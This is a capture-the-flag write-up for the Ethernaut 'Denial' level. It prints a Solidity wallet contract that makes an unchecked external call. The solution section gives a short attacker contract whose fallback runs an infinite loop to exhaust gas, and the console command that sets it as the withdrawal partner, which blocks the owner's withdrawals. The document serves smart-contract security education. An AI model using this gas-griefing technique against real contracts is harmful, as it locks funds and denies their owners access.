# Level 20 - Denial

### Objective

The objective of this level is as follows:

1. This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
2. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

### Solution

Solution inspired by [this_post](https://medium.com/@this_post/ethernaut-20-denial-writeups-17ed0bdc8857):

First, create a contract with an infinite loop that consumes all forwarding gas:

```
contract Solve {

    fallback() payable external {
        while(true){

        }
    }

}
```

Finally, set the `partner` address as the `Solve` contract address:

```
await contract.setWithdrawPartner(SOLVE_CONTRACT_ADDRESS)

```

Done!
